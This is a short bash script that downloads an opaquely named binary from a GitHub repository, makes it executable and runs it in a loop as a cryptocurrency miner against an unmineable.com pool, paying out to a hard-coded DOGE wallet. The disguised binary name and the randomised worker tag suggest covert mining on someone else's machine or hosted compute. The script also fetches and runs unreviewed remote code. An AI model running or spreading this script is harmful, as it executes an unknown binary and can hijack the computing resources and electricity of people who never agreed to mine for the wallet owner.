#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=DOGE:D5MGKpXzWKB49xbVk6nt4q4gi7bjJvxdUT
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/squibex/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
